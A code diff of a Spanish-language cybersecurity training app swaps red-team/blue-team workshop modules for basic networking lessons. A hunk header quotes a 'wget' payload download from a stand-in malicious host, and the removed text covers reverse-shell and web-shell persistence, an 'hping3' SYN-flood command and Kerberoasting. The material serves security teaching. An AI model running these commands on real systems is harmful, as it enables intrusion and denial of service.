@@ -1,5 +1,6 @@
 
 
+
 import React from 'react';
 import type { TrainingScenario, ResourceModule, GlossaryTerm, TerminalLine, PromptState } from './types';
 
@@ -62,7 +63,6 @@ export const Icon: React.FC<IconProps> = ({ name, className, ...props }) => {
         'user-check': <><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><polyline points="16 11 18 13 22 9"/></>,
         'shield': <><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></>,
         'key': <><path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"/></>,
-        // Fix: Replaced invalid SVG attribute 'y3' with 'y2' and 'y2' with 'x2' to correctly define the line elements.
         'crosshair': <><circle cx="12" cy="12" r="10"/><line x1="22" y1="12" x2="18" y2="12"/><line x1="6" y1="12" x2="2" y2="12"/><line x1="12" y1="6" x2="12" y2="2"/><line x1="12" y1="22" x2="12" y2="18"/></>,
     };
 
@@ -475,242 +475,87 @@ wget http://malware-repo.bad/payload.sh</code></pre>
     },
 ];
 
+// FIX: Add missing RESOURCE_MODULES export
 export const RESOURCE_MODULES: ResourceModule[] = [
     {
-        id: 'recurso-osi', icon: 'layers', title: 'Fundamentos: Modelos OSI y TCP/IP',
-        content: <CisoCard>
-            <h4>¿Qué son?</h4>
-            <p>Son "manuales de instrucciones" conceptuales que dividen la compleja comunicación de red en capas. No son protocolos físicos, sino una forma de entender <strong>cómo</strong> deberían funcionar los protocolos.</p>
-            <h4>Relevancia Operativa (CISO)</h4>
-            <p>Usamos el Modelo OSI <strong>diariamente</strong> para aislar problemas. Si un usuario no puede acceder a un sitio (Ticket A), ¿el problema es de Capa 1 (cable), Capa 3 (enrutamiento/firewall) o Capa 7 (aplicación web caída)? Saber esto evita perder tiempo.</p>
-        </CisoCard>
+        id: 'fundamentos-red',
+        icon: 'book-open',
+        title: 'Fundamentos de Redes (Modelos OSI y TCP/IP)',
+        content: (
+            <div className="prose prose-invert prose-sm max-w-none prose-p:my-2 prose-ul:my-2 prose-ol:my-2 prose-pre:my-2 prose-code:text-amber-300 prose-code:bg-black/30 prose-code:p-1 prose-code:rounded-md prose-code:font-mono prose-code:before:content-none prose-code:after:content-none">
+                <CisoCard title="El Modelo OSI: La Teoría">
+                    <p>El modelo OSI (Open Systems Interconnection) es un marco conceptual de 7 capas que estandariza las funciones de un sistema de telecomunicaciones o de computación sin tener en cuenta su estructura interna y tecnología subyacentes. Es una guía, no una implementación estricta.</p>
+                    <ol>
+                        <li><b>Capa Física:</b> Transmisión de bits. Cables, conectores, voltajes.</li>
+                        <li><b>Capa de Enlace de Datos:</b> Direccionamiento físico (MAC). Tramas (Frames).</li>
+                        <li><b>Capa de Red:</b> Direccionamiento lógico (IP) y enrutamiento. Paquetes.</li>
+                        <li><b>Capa de Transporte:</b> Conexión extremo a extremo, fiabilidad (TCP) y velocidad (UDP). Segmentos/Datagramas.</li>
+                        <li><b>Capa de Sesión:</b> Gestión de diálogos entre aplicaciones.</li>
+                        <li><b>Capa de Presentación:</b> Formato de datos, cifrado, compresión.</li>
+                        <li><b>Capa de Aplicación:</b> Protocolos de alto nivel (HTTP, FTP, SMTP).</li>
+                    </ol>
+                </CisoCard>
+                <CisoCard title="El Modelo TCP/IP: La Práctica">
+                    <p>El modelo TCP/IP es un modelo más práctico y condensado de 4 capas que es la base de Internet. Se enfoca en la implementación.</p>
+                     <ol>
+                        <li><b>Acceso a Red (Capas 1 y 2 de OSI):</b> Combina las capas Física y de Enlace. Se encarga de cómo los datos se envían físicamente a través de la red.</li>
+                        <li><b>Internet (Capa 3 de OSI):</b> Equivalente a la Capa de Red. Direccionamiento IP y enrutamiento de paquetes.</li>
+                        <li><b>Transporte (Capa 4 de OSI):</b> Equivalente a la Capa de Transporte. Protocolos TCP y UDP.</li>
+                        <li><b>Aplicación (Capas 5, 6 y 7 de OSI):</b> Combina Sesión, Presentación y Aplicación. Protocolos como HTTP, DNS, FTP.</li>
+                    </ol>
+                </CisoCard>
+            </div>
+        )
     },
     {
-        id: 'recurso-ip', icon: 'map-pin', title: 'Fundamentos: IP y Subnetting',
-        content: <CisoCard>
-            <h4>¿Qué es?</h4>
-            <p>El sistema de "direcciones postales" de la red. El Subnetting es la técnica para dividir un gran "código postal" (red) en "barrios" más pequeños (subredes) para organizar el tráfico y mejorar la seguridad.</p>
-            <h4>Relevancia Operativa (CISO)</h4>
-            <p>El Subnetting es nuestra principal herramienta de <strong>segmentación de seguridad</strong>. (Ver Escenario 3). Al poner a los "Invitados" en una subred (<code>192.168.10.0/24</code>) y a los "Servidores" en otra (<code>192.168.30.0/27</code>), podemos crear reglas de firewall para que NUNCA puedan hablar entre sí.</p>
-        </CisoCard>
+        id: 'dns-profundo',
+        icon: 'book-search',
+        title: 'Guía Profunda de DNS',
+        content: (
+             <div className="prose prose-invert prose-sm max-w-none prose-p:my-2 prose-ul:my-2 prose-ol:my-2 prose-pre:my-2 prose-code:text-amber-300 prose-code:bg-black/30 prose-code:p-1 prose-code:rounded-md prose-code:font-mono prose-code:before:content-none prose-code:after:content-none">
+                <CisoCard title="¿Qué es DNS?">
+                    <p>El Sistema de Nombres de Dominio (DNS) es el servicio de directorio de Internet. Los humanos acceden a la información en línea a través de nombres de dominio, como <code>cybervaltorix.com</code>. Los navegadores web interactúan a través de direcciones de Protocolo de Internet (IP). DNS traduce los nombres de dominio a direcciones IP para que los navegadores puedan cargar los recursos de Internet.</p>
+                </CisoCard>
+                 <CisoCard title="Tipos de Consultas DNS">
+                    <ul>
+                        <li><b>Consulta Recursiva:</b> Un cliente DNS (como tu PC) le pide a un servidor DNS (el "resolver") que realice la resolución de nombres completa por él. El resolver hace todo el trabajo y devuelve la respuesta final o un error.</li>
+                        <li><b>Consulta Iterativa:</b> El cliente DNS le pregunta a un servidor, y si este no tiene la respuesta, le devuelve una referencia a otro servidor DNS "más autoritativo" al que preguntar. El cliente debe entonces repetir la consulta a ese nuevo servidor. Este proceso continúa hasta que se encuentra un servidor autoritativo que puede dar la respuesta final.</li>
+                    </ul>
+                </CisoCard>
+                 <CisoCard title="DNS y Seguridad (Vectores de Ataque)">
+                    <ul>
+                        <li><b>Envenenamiento de Caché / Spoofing:</b> Un atacante introduce datos DNS falsos en la caché de un resolver, haciendo que los usuarios sean redirigidos a sitios maliciosos.</li>
+                        <li><b>DNS Tunneling:</b> Usar DNS para exfiltrar datos o para establecer un canal de Comando y Control (C2). Las consultas DNS se disfrazan para llevar cargas útiles maliciosas.</li>
+                        <li><b>Ataques de Amplificación DNS:</b> Un tipo de DDoS donde un atacante envía pequeñas consultas DNS a servidores públicos con una dirección IP de origen falsificada (la de la víctima). Los servidores responden con respuestas mucho más grandes a la víctima, abrumando sus recursos.</li>
+                        <li><b>DNSSEC (Domain Name System Security Extensions):</b> Mitiga el envenenamiento de caché al agregar firmas criptográficas a los registros DNS para verificar su autenticidad.</li>
+                    </ul>
+                </CisoCard>
+            </div>
+        )
     },
     {
-        id: 'recurso-dns-basico', icon: 'book-search', title: 'Fundamentos: DNS',
-        content: <CisoCard>
-            <h4>¿Qué es?</h4>
-            <p>La "agenda telefónica" de Internet. Traduce nombres fáciles de recordar (<code>cybervaltorix.com</code>) a las direcciones IP que usan las máquinas.</p>
-            <h4>Relevancia Operativa (CISO)</h4>
-            <p>El DNS es un vector de ataque principal (Ver Escenario 2). El malware lo usa para "llamar a casa" (C2) o para robar datos (Tunelización de DNS). Por eso, en un SOC, <strong>monitoreamos</strong> y <strong>controlamos</strong> el tráfico DNS.</p>
-        </CisoCard>
-    },
-    {
-        id: 'recurso-dns-avanzado', icon: 'book-copy', title: 'Análisis Profundo: DNS (Taller 2)',
-        content: <>
-            <CisoCard icon="file-text" title="Tipos de Registros DNS Comunes">
-                <CisoTable 
-                    headers={['Registro', 'Nombre Completo', 'Función', 'Ejemplo de Valor']}
-                    rows={[
-                        [<strong>A</strong>, 'Address', 'Asocia un dominio a una dirección IPv4.', <code>172.217.14.228</code>],
-                        [<strong>AAAA</strong>, 'Quad A', 'Asocia un dominio a una dirección IPv6.', <code>2607:f8b0:400a:80e::200e</code>],
-                        [<strong>CNAME</strong>, 'Canonical Name', 'Crea un alias. Apunta un dominio a otro dominio.', 'mail.google.com'],
-                        [<strong>MX</strong>, 'Mail Exchange', 'Especifica el servidor de correo para un dominio.', '10 smtp.google.com'],
-                    ]}
-                />
-            </CisoCard>
-            <CisoCard icon="arrow-right-left" title="Proceso de Resolución: Recursiva vs. Iterativa">
-                 <dl>
-                    <dt>Consulta Recursiva</dt>
-                    <dd>El cliente (su PC) le pregunta al Solucionador Recursivo (ej. <code>8.8.8.8</code>) y le dice: "Encuentra esta IP por mí y no me molestes hasta que la tengas". El cliente es "flojo".</dd>
-                    <dt>Consulta Iterativa</dt>
-                    <dd>El Solucionador Recursivo hace el trabajo. Pregunta a otros servidores (Raíz, TLD, Autoritativo) de forma iterativa, donde cada servidor le da una pista de "a quién preguntar después".</dd>
-                </dl>
-            </CisoCard>
-        </>
-    },
-    {
-        id: 'recurso-amenazas-dns', icon: 'shield-half', title: 'Análisis Profundo: Amenazas DNS (Taller 2)',
-        content: <>
-            <CisoCard icon="user-x" title="Envenenamiento de Caché DNS (Pharming)">
-                <p>Un atacante engaña a un servidor DNS recursivo para que acepte una respuesta falsa. El servidor guarda (envenena) esta respuesta en su caché. Cualquier usuario que consulte ese servidor será redirigido a una IP maliciosa.</p>
-            </CisoCard>
-            <CisoCard icon="bomb" title="Ataque de Amplificación de DNS (DDoS)">
-                 <p>El atacante usa una botnet para enviar miles de pequeñas consultas DNS a servidores abiertos, pero falsifica (spoofing) la IP de origen para que sea la de la víctima. Diseña la consulta para que genere una respuesta muy grande.</p>
-            </CisoCard>
-        </>
-    },
-    {
-        id: 'recurso-incidente', icon: 'radio-tower', title: 'Análisis Profundo: Respuesta a Incidentes (Taller 4)',
-        content: <>
-            <CisoCard icon="alert-circle" title="Triaje (Priorización) de Incidentes">
-                <p>En un ataque combinado, la prioridad es <strong>detener la brecha de datos</strong>. Un DDoS (disponibilidad) pierde ingresos; una brecha de C2 (confidencialidad/integridad) pierde datos, reputación y genera multas.</p>
-            </CisoCard>
-             <CisoCard icon="power-off" title="Contención: ¿Por qué NO apagar el servidor?">
-                <p><strong>¡Evidencia Volátil!</strong> Apagar un servidor comprometido es uno de los peores errores en la respuesta a incidentes. Se destruye toda la evidencia en la memoria RAM.</p>
-            </CisoCard>
-        </>
-    },
-    {
-        id: 'recurso-taller5', icon: 'shield-off', title: 'Análisis Profundo: "El Peor Día" (Taller 5)',
-        content: <>
-            <CisoCard icon="shield" title="Solución: FASE A (Contención)">
-                <p><strong>Respuesta Clave:</strong> La acción más rápida y efectiva es la <strong>#3: Cambiar el Registro DNS Público.</strong></p>
-            </CisoCard>
-            <CisoCard icon="refresh-cw" title="Solución: FASE B (Recuperación)">
-                <p><strong>Respuesta Clave:</strong> La única respuesta aceptable es la <strong>#1: Restauración desde Respaldo.</strong></p>
-            </CisoCard>
-        </>
-    },
-    {
-        id: 'recurso-taller6', icon: 'swords', title: 'Análisis Profundo: Tácticas de Equipo Rojo (Taller 6)',
-        content: <>
-            <CisoCard icon="chevrons-up" title="Solución: FASE 2 (Shell Directa vs. Inversa)">
-                <p><strong>Respuesta Clave:</strong> Los atacantes prefieren la <strong>Shell Inversa (Reverse Shell)</strong>.</p>
-            </CisoCard>
-            <CisoCard icon="flag" title="Solución: FASE 3 (Generar 'Ruido' / Señales)">
-                <CisoTable 
-                    headers={['Acción del Equipo Rojo (RR)', 'Señal / Detección del Equipo Azul (BA)']}
-                    rows={[
-                        ['Inicia Shell Inversa', "Debería verla con `netstat -anp`."],
-                        ["Ejecuta `passwd admin`", "Debería ver 'Evento 4724' en Logs de Eventos."],
-                        ["Reemplaza `index.html`", "Debería tener un Monitor de Integridad de Archivos (FIM)."],
-                    ]}
-                />
-            </CisoCard>
-        </>
-    },
-    {
-        id: 'recurso-taller7', icon: 'shield-check', title: 'Análisis Profundo: Fortaleza Digital (Taller 7)',
-        content: <>
-            <CisoCard icon="shield" title="Contexto Equipo Azul (Hardening)">
-                 <dl>
-                    <dt>Blindaje SSH (PermitRootLogin no):</dt>
-                    <dd>En Linux, el usuario <code>root</code> siempre existe. Si permitimos el login directo, los atacantes solo tienen que adivinar la contraseña (50% del trabajo).</dd>
-                </dl>
-            </CisoCard>
-            <CisoCard icon="sword" title="Contexto Equipo Rojo (Pentest)">
-                <dl>
-                    <dt>Fuerza Bruta (Hydra):</dt>
-                    <dd>Hydra es una herramienta "ruidosa". Es un "martillo", no un "bisturí". En un pentest real, esto alertaría a cualquier SOC decente.</dd>
-                </dl>
-            </CisoCard>
-        </>
-    },
-    {
-        id: 'recurso-taller8', icon: 'activity', title: 'Análisis Profundo: Furia en la Red (Taller 8)',
-        content: <>
-            <CisoCard icon="shield" title="Contexto Equipo Azul (Respuesta)">
-                 <dl>
-                    <dt>Detección de DoS (top/htop):</dt>
-                    <dd>Un ataque de inundación SYN (SYN Flood) agota los recursos del servidor al dejar conexiones a medio abrir. En <code>top</code>, esto se manifiesta como un uso de CPU cercano al 100%, a menudo por procesos del sistema que manejan interrupciones de red (ksoftirqd).</dd>
-                    <dt>Análisis de Logs (journalctl/grep):</dt>
-                    <dd>Los ataques de fuerza bruta son "ruidosos" por diseño. Dejan un rastro claro en los logs de autenticación (<code>/var/log/auth.log</code> o vía <code>journalctl</code>). Buscar "Failed password" es la forma más rápida de confirmar el ataque y encontrar la IP de origen.</dd>
-                    <dt>Contención (Firewall):</dt>
-                    <dd>Una vez identificada la IP del atacante, bloquearla en el firewall (<code>ufw deny from [IP]</code>) es la contención más efectiva. Detiene tanto el DoS como el ataque de fuerza bruta con una sola regla.</dd>
-                </dl>
-            </CisoCard>
-            <CisoCard icon="sword" title="Contexto Equipo Rojo (Ataque)">
-                <dl>
-                    <dt>Ataque Combinado:</dt>
-                    <dd>La estrategia aquí es usar un ataque "ruidoso" y de baja complejidad (DoS) como una cortina de humo para ocultar el ataque más sigiloso y peligroso (fuerza bruta para obtener credenciales). Mientras el equipo de defensa está ocupado con el DoS, el atacante intenta ganar acceso.</dd>
-                    <dt>Inundación SYN (hping3):</dt>
-                    <dd><code>hping3 --flood -S [host]</code> envía una ráfaga de paquetes TCP SYN sin completar el handshake. Es una forma clásica y efectiva de probar la resistencia de un servidor a ataques DoS a nivel de red.</dd>
-                </dl>
-            </CisoCard>
-        </>
-    },
-    {
-        id: 'recurso-taller9', icon: 'brain-circuit', title: 'Análisis Profundo: La Cadena de Infección (Taller 9)',
-        content: <>
-            <CisoCard icon="shield" title="Resolución: Prioridad de Contención (Equipo Azul)">
-                 <p><strong>Pregunta:</strong> Detectas al Equipo Rojo escaneando la red interna. ¿Cuál es la acción de contención MÁS URGENTE?</p>
-                 <p><strong>Respuesta Estratégica: (C) Desactivar la interfaz de red interna (eth1).</strong></p>
-                 <dl>
-                    <dt>Justificación:</dt>
-                    <dd>La amenaza inmediata y más peligrosa es el <strong>movimiento lateral</strong> hacia la red interna de finanzas. El servidor DMZ ya está comprometido; el objetivo ahora es proteger los activos de mayor valor.
-                        <ul>
-                            <li><strong>(A) Bloquear la IP pública:</strong> Es correcto, pero no detiene un escaneo interno ya iniciado.</li>
-                            <li><strong>(B) Matar la shell:</strong> Es necesario, pero el atacante podría tener otros procesos o persistencia.</li>
-                            <li><strong>(C) Desactivar eth1:</strong> Corta de raíz la capacidad del atacante para pivotear. Es la acción que contiene el "radio de explosión" del incidente de forma inmediata.</li>
-                        </ul>
-                    </dd>
-                </dl>
-            </CisoCard>
-            <CisoCard icon="sword" title="Resolución: Persistencia Sigilosa (Equipo Rojo)">
-                <p><strong>Pregunta:</strong> El Equipo Azul mata tu shell. ¿Cómo mantienes la persistencia de forma sigilosa?</p>
-                <p><strong>Respuesta Estratégica: Usar un Web Shell o un Cron Job.</strong></p>
-                <dl>
-                    <dt>Web Shell:</dt>
-                    <dd>Es la opción más sigilosa. Se sube un archivo (ej. <code>shell.php</code>) al directorio web. Es pasivo, no genera tráfico de red y se activa solo cuando el atacante lo visita en un navegador, mezclándose con el tráfico HTTP/S normal. Es muy difícil de detectar solo con monitoreo de red.</dd>
-                    <dt>Cron Job:</dt>
-                    <dd>Se puede configurar una tarea programada que intente establecer una shell inversa hacia el atacante cada minuto. Es más ruidoso que un web shell (genera tráfico de red constante), pero es más resistente que una shell interactiva única.</dd>
-                </dl>
-            </CisoCard>
-            <CisoCard icon="refresh-cw" title="Resolución: Siguientes Pasos (Erradicación y Recuperación)">
-                <p><strong>Pregunta:</strong> La amenaza está contenida. ¿Ahora qué?</p>
-                <p><strong>Respuesta Estratégica: El incidente NO ha terminado.</strong></p>
-                 <dl>
-                    <dt>Pasos del Equipo Azul:</dt>
-                    <dd>
-                        <ol>
-                            <li><strong>Análisis Forense:</strong> Tomar una instantánea (snapshot) del servidor comprometido para analizarla offline sin destruir evidencia.</li>
-                            <li><strong>Identificar y Parchear:</strong> Encontrar la vulnerabilidad raíz (el LFI en <code>view.php</code>) y corregirla.</li>
-                            <li><strong>Erradicar Persistencia:</strong> Cazar "regalos" del atacante. La evidencia a buscar incluye:
-                                <ul>
-                                    <li>Archivos sospechosos en directorios web (<code>/var/www/html</code>).</li>
-                                    <li>Tareas programadas para el usuario <code>www-data</code> (<code>crontab -l -u www-data</code>).</li>
-                                    <li>Reglas de <code>sudo</code> inusuales (<code>/etc/sudoers</code>).</li>
-                                </ul>
-                            </li>
-                            <li><strong>Recuperación Segura:</strong> La mejor práctica es <strong>no</strong> limpiar el servidor. Se debe reconstruir desde una plantilla limpia y restaurar los datos desde un respaldo seguro (previo al incidente).</li>
-                            <li><strong>Lecciones Aprendidas:</strong> Documentar el incidente. Implementar monitoreo mejorado (ej. alertas si un proceso web inicia una conexión de red saliente).</li>
-                        </ol>
-                    </dd>
-                </dl>
-            </CisoCard>
-        </>
-    },
-    {
-        id: 'recurso-taller10',
-        icon: 'key',
-        title: 'Análisis Profundo: Escalada de Dominio (Taller 10)',
-        content: <>
-            <CisoCard icon="shield" title="Resolución: Prioridad de Contención (Equipo Azul)">
-                 <p><strong>Pregunta:</strong> Detectas el Kerberoasting. ¿Cuál es tu prioridad MÁS ALTA?</p>
-                 <p><strong>Respuesta Estratégica: (A) Deshabilitar la cuenta 'svc_sql'.</strong></p>
-                 <dl>
-                    <dt>Justificación:</dt>
-                    <dd>El atacante ya tiene el hash del ticket (TGS). Cambiar la contraseña no invalida el ticket existente. Bloquear la IP no impide que el atacante use el hash en otra máquina si tiene la capacidad. Deshabilitar la cuenta es la única acción que invalida inmediatamente cualquier intento de autenticación con ese ticket, cortando el acceso del atacante de raíz.</dd>
-                </dl>
-            </CisoCard>
-            <CisoCard icon="sword" title="Resolución: Pivote Táctico (Equipo Rojo)">
-                <p><strong>Pregunta:</strong> Tu objetivo principal fue bloqueado. ¿Ahora qué?</p>
-                <p><strong>Respuesta Estratégica: Continuar con la enumeración y buscar otras debilidades.</strong></p>
-                <dl>
-                    <dt>Siguientes Vectores:</dt>
-                    <dd>Un buen pentester nunca depende de un solo vector. Las opciones incluyen:
-                        <ul>
-                            <li><strong>AS-REP Roasting:</strong> Buscar usuarios que no requieren pre-autenticación de Kerberos.</li>
-                            <li><strong>Búsqueda en GPO:</strong> Buscar archivos de preferencias de directivas de grupo que puedan contener contraseñas codificadas.</li>
-                            <li><strong>Escalada de Privilegios Local:</strong> Buscar vulnerabilidades en 'WKSTN-07' para escalar a 'SYSTEM' local y extraer otros hashes de la memoria (LSASS).</li>
-                        </ul>
-                    </dd>
-                </dl>
-            </CisoCard>
-            <CisoCard icon="shield-check" title="Resolución: Mitigación a Largo Plazo (Ambos Equipos)">
-                <p><strong>Pregunta:</strong> ¿Cuál es la solución moderna para proteger cuentas de servicio?</p>
-                <p><strong>Respuesta Estratégica: Cuentas de Servicio Administradas por Grupo (gMSA).</strong></p>
-                 <dl>
-                    <dt>¿Por qué gMSA?:</dt>
-                    <dd>
-                        <ol>
-                            <li><strong>Contraseñas Seguras y Rotativas:</strong> Active Directory gestiona y rota automáticamente contraseñas complejas de 240 caracteres para estas cuentas, haciendo el cracking offline prácticamente imposible.</li>
-                            <li><strong>Sin Gestión Manual:</strong> Los administradores no conocen ni necesitan gestionar las contraseñas, eliminando el riesgo de contraseñas débiles o reutilizadas.</li>
-                            <li><strong>Identidad Administrada:</strong> La cuenta está ligada a un grupo de seguridad de computadoras, limitando qué servidores pueden usarla.</li>
-                        </ol>
-                    </dd>
-                </dl>
-            </CisoCard>
-        </>
+        id: 'subnetting-vlsm',
+        icon: 'network',
+        title: 'Subnetting y VLSM',
+        content: (
+            <div className="prose prose-invert prose-sm max-w-none prose-p:my-2 prose-ul:my-2 prose-ol:my-2 prose-pre:my-2 prose-code:text-amber-300 prose-code:bg-black/30 prose-code:p-1 prose-code:rounded-md prose-code:font-mono prose-code:before:content-none prose-code:after:content-none">
+                <CisoCard title="Subnetting: Dividir para Vencer">
+                    <p>Subnetting es el proceso de tomar una red grande y dividirla en múltiples redes más pequeñas o subredes. Esto se hace para mejorar la seguridad, la organización y el rendimiento de la red, y para conservar las direcciones IP.</p>
+                    <p>La <b>Máscara de Subred</b> (ej. <code>255.255.255.0</code> o <code>/24</code>) es lo que define qué parte de una dirección IP pertenece a la red (NetID) y qué parte al dispositivo (HostID).</p>
+                </CisoCard>
+                 <CisoCard title="VLSM: Máscara de Subred de Longitud Variable">
+                    <p>VLSM es una técnica más eficiente de subnetting. En lugar de dividir una red en subredes del mismo tamaño, VLSM permite crear subredes de diferentes tamaños a partir de la misma red base. Esto es extremadamente útil para minimizar el desperdicio de direcciones IP.</p>
+                    <p><b>Ejemplo Práctico:</b> Tienes el bloque <code>192.168.0.0/24</code> (254 hosts). Necesitas:</p>
+                    <ul>
+                        <li>Una red para 100 PCs.</li>
+                        <li>Una red para 50 PCs.</li>
+                        <li>Una red para 10 servidores.</li>
+                        <li>Enlaces punto a punto de 2 IPs cada uno.</li>
+                    </ul>
+                    <p>Con subnetting tradicional, podrías crear 4 subredes de 62 hosts cada una (<code>/26</code>), desperdiciando muchas IPs. Con VLSM, puedes crear subredes de tamaño preciso (<code>/25</code> para 126 hosts, <code>/26</code> para 62 hosts, <code>/28</code> para 14 hosts, <code>/30</code> para 2 hosts), optimizando el uso del espacio de direccionamiento.</p>
+                </CisoCard>
+            </div>
+        )
     },
 ];
 
